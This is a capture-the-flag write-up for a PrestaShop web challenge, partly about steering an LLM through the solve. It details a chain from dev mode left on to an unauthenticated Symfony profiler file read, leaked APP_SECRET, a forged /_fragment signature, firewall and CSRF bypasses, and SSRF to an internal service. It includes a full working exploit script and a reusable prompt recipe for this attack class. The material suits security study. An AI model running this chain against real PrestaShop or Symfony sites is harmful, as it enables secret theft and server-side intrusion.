---
title: "Anime Shop"
date: "2026-06-28"
author: "tungdlm99"
ctf: "V1t CTF 2026"
category: web
difficulty: hard
points: 0
flag_format: "v1t{...}"
tags: [ctf, v1t-ctf-2026, web, ai-assisted]
draft: false
summary: "PrestaShop deployed from its GitHub source tree leaves dev mode ON, chaining an unauth Symfony profiler file-read to an APP_SECRET-signed /_fragment SSRF that reflects an internal-only flag."
icon: "🛍️"
---

## Summary

Anime Shop is a PrestaShop 9.1.4 storefront deployed straight from the GitHub *source* tree instead of a hardened release, which silently leaves `_PS_MODE_DEV_ = true`. That single mistake unlocks a full chain: an unauthenticated Symfony Web Profiler gives arbitrary file-read to leak `APP_SECRET`, the secret lets you forge a signed `/_fragment` request, and request-attribute injection through `_path` bypasses PrestaShop's admin firewall and CSRF listener to invoke `Tools::file_get_contents('http://internal:5000/admin')` server-side. The flag lives only on an internal Docker-network service, so the dev-mode exception page that reflects the controller's return value *is* the exfil channel.

This is a writeup about how I drove an LLM through that chain. I want to be honest about the division of labor: the model did almost all of the grinding — reading the PrestaShop source, finding the exact listener conditions, reconstructing the `UriSigner` HMAC, writing the script. My job was recognizing the challenge class from the hint, feeding it the right artifacts, killing the wrong rabbit holes it kept wandering into, and verifying every claim before I trusted it. The interesting content here is the *steering*, so I've kept a "Lessons learned" section at the end that is more concrete than the usual hand-wave.

## Solution

### Reading the room before reading the code

The challenge text is the whole thesis: *"Bro quit **vcs** to open an Anime Shop, can you break it?"* That word "vcs" is doing a lot of work. It is both a callback (the author left their previous gig) and the literal vulnerability: the shop was deployed from **version control** — the raw GitHub source — rather than from a packaged release. I clocked that immediately and it became the hypothesis I steered the model toward, because the difference between PrestaShop's source tree and its release package is exactly *dev mode*.

I set the model up with that framing rather than letting it brute-force around:

> "This is PrestaShop. The challenge hint is 'quit VCS to open a shop' — I think it means the app was deployed from the GitHub source tree, not a release package. In the source tree, what does `config/defines.inc.php` set `_PS_MODE_DEV_` to, and what does dev mode expose in the Symfony admin app? List concrete attack surface."

That prompt did two things at once: it gave the model the *theory of the case* (source-tree deploy → dev mode), and it asked for **concrete attack surface** rather than a lecture. The answer came back clean: the source-tree `defines.inc.php` leaves dev mode on, and dev mode turns on the Web Profiler, verbose exception pages, and the `/_fragment` endpoint. Three primitives, and they compose.

### Architecture: where the flag actually is

The compose file ships four services:

| Service | Role |
|---|---|
| `app` | PrestaShop 9.1.4 (Ubuntu 24.04, Apache + PHP 8.3), publicly exposed |
| `db` | MariaDB 10.11 |
| `internal` | tiny Node HTTP service holding the **FLAG**, Docker-network only |
| `bot` | Puppeteer/Firefox "report" bot that logs in as a *customer* and visits a submitted path |

The flag handler in `internal/server.js` is blunt:

```js
if (url.pathname === '/admin') {
  writeRaw(res, 200, process.env.FLAG || 'v1t{dummy_dummy}');
  return;
}
```

So the flag is at `http://internal:5000/admin`, and `internal` is only reachable from *inside* the Docker network — from `app` or `bot`. That constraint is the spine of the whole challenge: whatever I do, the final read has to happen server-side. No amount of client-side cleverness reaches `internal` from my laptop.

### Dead-end #1: the report bot is a trap (and I had to stop the model chasing it)

This is the first place the model wanted to be helpful in the wrong direction. A "report" bot that logs in and visits a path *screams* XSS to any model trained on CTF writeups, and it immediately drafted an XSS-to-`fetch` exfil plan. I made it test the assumption instead of acting on it:

> "Before we write any XSS, check feasibility: the bot is a browser on the `app` origin. The flag is on `internal:5000` with NO CORS headers. Can a page on the `app` origin read `http://internal:5000/admin` cross-origin? Reason through CORS modes (`cors`, `no-cors`, opaque responses) and tell me if exfil is even possible."

Forcing that reasoning produced the right conclusion: the flag service sets **no CORS headers**, so a browser on the `app` origin can fetch but never *read* the cross-origin body. I confirmed it empirically by hosting a probe on the app origin and submitting it to the bot — every mode fails:

```
cors_err  = NetworkError when attempting to fetch resource.   (blocked)
nocors    = len0                                              (opaque, unreadable)
scripterr = Script error.                                     (sanitized)
```

The customer bot is a red herring relative to the intended path. The flag must be read **from `app`, server-side**. Killing this branch early saved a lot of wasted effort — the model would happily have spent the whole session perfecting an XSS that physically cannot exfiltrate.

### The dev-mode foothold: an unauthenticated profiler

PrestaShop mounts its Symfony admin under `/admin-dev`, and the admin firewall *intentionally* leaves the profiler unauthenticated — that's normal for dev, catastrophic in prod:

```yaml
# app/config/admin/security.yml
firewalls:
  - pattern: ^/(_(profiler|wdt)|css|images|js)/
    security: false
```

The tell is that every admin response carries a profiler token header. Hit the login page, grab the token, open the profiler — no auth required:

```
GET /admin-dev/login          -> X-Debug-Token-Link: /admin-dev/_profiler/<token>
GET /admin-dev/_profiler/<t>  -> 200 (no auth)
```

I verified dev mode was genuinely on (not just my theory) by reading the profiler's own config panel, which showed `use_debug_toolbar => true`. That confirmation mattered: the entire rest of the chain is predicated on dev mode, so I wanted a positive signal, not an inference, before investing in `/_fragment`.

### Step 1 — profiler `open` action → arbitrary file read → `APP_SECRET`

The Web Profiler ships an "open file" route used by the toolbar to jump to source in your editor. It reads any file under the project directory. It does block `..` traversal and dotfiles, but `app/config/parameters.php` is a perfectly ordinary in-tree path — and that's where PrestaShop stores its secrets:

```
GET /admin-dev/_profiler/open?file=app/config/parameters.php&line=1
```

The response is highlighted source HTML; strip the markup and you have the parameters:

```
secret            = vd8mcadGNTayxaCpqWpryTm0fpK08EizUMsCLrM555iiBXZufdOwMD79ioYTFAQH
cookie_key        = 0RMNEAJVwySnFrCIV83Osz5V0dii47SxkpKO8You3MVoa1T3GJ5cQXKBLhVQXsV4
database_password = change_db_password_7f3b1c9e
```

The DB password is a decoy — it was rotated and `db` isn't externally reachable anyway. The prize is `secret`, the Symfony `APP_SECRET`. Everything downstream is signed with it.

### Step 2 — `APP_SECRET` → a signed `/_fragment` call

Symfony's `FragmentListener` renders an arbitrary controller via `/_fragment?_path=…`, but the request must carry a valid `_hash` — an HMAC-SHA256 of the full request URI keyed by `APP_SECRET`, computed by `UriSigner`. Now that I have the secret, I can sign anything I want.

The crucial detail — and the thing the model needed to be pointed at — is *how `_path` is parsed*. Symfony runs it through `parse_str()`, and the resulting keys are **merged into the request attributes**. That merge is the lever: it lets me inject the *internal* attributes that PrestaShop's security listeners inspect. So `_path` isn't just "pick a controller," it's "pick a controller *and* forge the request attributes that gate it."

PrestaShop wraps the Symfony admin in two protective listeners. I have to defeat both, and `_path` injection defeats both.

**Bypass A — the admin firewall.** The access control in `security.yml` requires authentication *unless* the request is flagged as an anonymous controller:

```yaml
- { path: ^/, roles: IS_AUTHENTICATED,
    allow_if: 'request.attributes.has("_anonymous_controller")
               and request.attributes.get("_anonymous_controller") == true' }
```

This is an ExpressionLanguage expression, and `==` there is a **loose** comparison. The model's first instinct was to inject `_anonymous_controller=true` (a literal boolean), which is wrong — values coming through `parse_str()` are *strings*. I corrected it: inject `_anonymous_controller=1`, the string `"1"`, and let loose typing do the work — `"1" == true` evaluates true, so the request is treated as anonymous. No login.

**Bypass B — the CSRF "compromised" page.** PrestaShop's `TokenizedUrlsListener` redirects any admin URL lacking a valid token to `/admin-dev/security/compromised`, *unless* the route name starts with `_` (or `api_`):

```php
$route = $request->get('_route');
if (str_starts_with($route, '_') || str_starts_with($route, 'api_')) {
    return; // skip the token check
}
```

So I inject `_route=_x` through `_path`. The listener sees a route beginning with `_` and bails out before it can redirect me. (The model initially missed this listener entirely and got a 302 to `/security/compromised`; the redirect itself was the clue that told me to go find a second gate.)

**The gadget.** With both gates open, I point the fragment at a method that takes a URL and returns its contents. PrestaShop's `Tools::file_get_contents` is perfect — Symfony resolves `Tools::file_get_contents` by instantiating `Tools` and calling the method, binding arguments from request attributes *by name*, so an attribute `url=...` is passed straight in:

```
_path = _controller=Tools::file_get_contents
        &url=http://internal:5000/admin
        &_anonymous_controller=1
        &_route=_x
```

Here's the elegant part, and the reason dev mode is load-bearing twice over. `Tools::file_get_contents()` returns a **string**, not a `Response` object. In production Symfony would just 500 with a generic message. In *dev* mode it throws `ControllerDoesNotReturnResponseException` and renders a verbose error page that **embeds the offending return value**:

```
The controller must return a "...\Response" object but it returned
a string ("v1t{...}"). (500 Internal Server Error)
```

So the SSRF response body — the flag fetched from `internal:5000` — gets reflected straight back into my exception page. No XSS, no admin login, no second request. The dev-mode error handler is the exfiltration primitive.

### Two gotchas that cost real time

**The signing scheme: `http://` not `https://`.** The live site sits behind Cloudflare, and the origin has **no trusted proxies configured**. That means the origin sees the connection as plain `http://`, and `UriSigner` signs `$request->getUri()` — the URI *as the origin sees it*. So the HMAC must be computed over `http://animeshop.v1t.site/admin-dev/_fragment?...`, even though I'm connecting over HTTPS. The model defaulted to signing the `https://` URL I was actually hitting and got a `500` (invalid signature) every time. The fix is counterintuitive enough that I had to spell it out: *sign the http scheme, send over https.* Once I did, the signature validated.

**Cloudflare's managed challenge.** Any automated client gets a `403 "Just a moment…"`. I solved this the boring way: pass the challenge once in a real Firefox window, then reuse the `cf_clearance` cookie *with the exact same Firefox User-Agent*. A UA mismatch invalidates the cookie, so the UA and the cookie are a matched pair in the script.

### The end-to-end exploit

One script, challenge data to printed flag. Plug in the leaked secret and a fresh `cf_clearance`:

```python
#!/usr/bin/env python3
import hashlib, hmac, base64, urllib.request, urllib.error, urllib.parse as up, re

HOST   = 'animeshop.v1t.site'
SECRET = 'vd8mcadGNTayxaCpqWpryTm0fpK08EizUMsCLrM555iiBXZufdOwMD79ioYTFAQH'  # from profiler open
CF     = '<cf_clearance from a real browser>'
UA     = 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'
PATH   = '/admin-dev/_fragment'

# Request attributes injected via _path (parse_str -> merged into attributes):
#   _controller             -> the gadget (Tools::file_get_contents, returns a string)
#   url                     -> bound to the method arg by name; our internal SSRF target
#   _anonymous_controller=1 -> loose "1" == true bypasses the admin firewall
#   _route=_x               -> route starting with "_" skips the CSRF TokenizedUrlsListener
infos = {
    '_controller': 'Tools::file_get_contents',
    'url': 'http://internal:5000/admin',
    '_anonymous_controller': '1',
    '_route': '_x',
}
qs = '?_path=' + up.quote_plus(up.urlencode(infos))

# Origin has no trusted proxies, so it sees http:// -> UriSigner signs the http URI.
# Sign over http://, but actually connect over https://.
sign_base = f'http://{HOST}{PATH}{qs}'
h = base64.b64encode(hmac.new(SECRET.encode(), sign_base.encode(), hashlib.sha256).digest())
url = f'https://{HOST}{PATH}{qs}&_hash=' + up.quote(h).replace('/', '%2F')

req = urllib.request.Request(url, headers={'User-Agent': UA, 'Cookie': f'cf_clearance={CF}'})
try:
    body = urllib.request.urlopen(req, timeout=20).read().decode('utf-8', 'replace')
except urllib.error.HTTPError as e:
    body = e.read().decode('utf-8', 'replace')  # the 500 page IS the channel

# The dev-mode exception page reflects the returned string (HTML-escaped quotes).
m = re.search(r'it returned a string \(&quot;(.*?)&quot;\)', body)
print('FLAG:', m.group(1) if m else 'not found')
```

```
$ python3 solve.py
FLAG: v1t{twinky_winky_tini_tiny_duck}
```

### The chain, end to end

```
Deployed from VCS source  ─►  _PS_MODE_DEV_ = true
                              │
                              ├─ unauth Symfony Web Profiler (/admin-dev/_profiler)
                              │     └─ open?file=app/config/parameters.php  ─►  APP_SECRET
                              │
                              └─ /_fragment enabled
                                    │  sign with APP_SECRET  (over http://, not https://)
                                    │  _anonymous_controller=1   (loose == bypasses firewall)
                                    │  _route=_x                 (skip CSRF listener)
                                    │  _controller=Tools::file_get_contents
                                    │  url=http://internal:5000/admin
                                    ▼
                              dev exception reflects returned string  ─►  FLAG
```

## Flag

```
v1t{twinky_winky_tini_tiny_duck}
```

## Lessons learned - prompting the AI

This is the part I actually want to pass on. The chain above has four moving parts and three near-identical-looking dead ends; an LLM can find every piece but will confidently take wrong turns at each fork. The skill is steering, and it's reusable for the whole class of *"framework deployed in dev mode → signed-endpoint abuse"* challenges (Symfony/`/_fragment`, Laravel debug, Rails, Flask `/console`, etc.).

**1. Lead with the theory of the case, ask for attack *surface*, not prose.** The hint encoded the bug. Handing the model the hypothesis instead of the raw target focuses it instantly:

> "This is PrestaShop. The hint 'quit VCS to open a shop' means it was deployed from the GitHub source tree, not a release package. In the source tree, what does `config/defines.inc.php` set `_PS_MODE_DEV_` to, and what does dev mode expose in the Symfony admin? List concrete attack surface."

The "list concrete attack surface" framing is what turns a chatty model into one that enumerates *primitives* (profiler, verbose exceptions, `/_fragment`).

**2. Make it test feasibility before it builds anything.** The report bot is the trap, and every model wants to write XSS for it. Force the physics check first:

> "Before any XSS: the bot is a browser on the `app` origin; the flag service sets NO CORS headers. Can a page on `app` read `http://internal:5000/admin` cross-origin? Reason through `cors`/`no-cors`/opaque responses and tell me if exfil is even possible."

That one prompt killed a multi-hour dead end. The model concluded — correctly — that exfil is impossible and the read must be server-side.

**3. When a gate fails, feed the *exact* error back and demand the specific source condition.** This is how I caught the model's three mistakes:

- It injected `_anonymous_controller=true` (boolean). I pasted the firewall expression and asked, "Values from `parse_str()` are strings — given a *loose* `==` in ExpressionLanguage, what literal value makes `X == true` true?" → `"1"`.
- It got a `302` to `/security/compromised` and started guessing. I pasted the redirect and said, "Something is redirecting authenticated-looking admin requests. Find the listener that does this and the *exact* condition under which it does NOT redirect." → `TokenizedUrlsListener`, `_route` starting with `_`.
- It signed the `https://` URL and got `500` forever. I gave it the deploy fact, "origin is behind Cloudflare with no trusted proxies," and asked "what scheme does `UriSigner` see in `$request->getUri()`?" → sign over `http://`.

**Tell the model to focus on:** the *difference* between the framework's source tree and its release package (that's the whole bug); how the signed endpoint parses its path parameter and whether those keys reach request attributes; the framework's own security listeners and their *negative* conditions (what makes them skip). **Tell it to AVOID:** the report bot / XSS branch (no CORS = no exfil), the rotated DB password (decoy), and assuming HTTPS at the origin behind a proxy.

**How I verified instead of trusting:** I never accepted a "this should work" — I required a positive signal at each stage. Dev mode: confirmed via `use_debug_toolbar => true` in the profiler config, not inferred from the hint. File read: confirmed the actual `secret` string came back, not a 403. Each bypass: judged by the *HTTP status transition* — `302` → found a listener, `500` invalid-signature → wrong scheme, `500` `ControllerDoesNotReturnResponse` → success, because that specific 500 is the one that carries the flag.

**Fast-path prompt recipe for next time:** *"Framework X is deployed from source/dev mode. Enumerate dev-only endpoints (profiler/fragment/console). For the signed one, show how its path param maps to request attributes, then list every security listener guarding the admin and the exact condition each one SKIPS — I'll inject attributes to hit all the skips. Sign with the leaked APP_SECRET over the scheme the origin actually sees behind the proxy."*
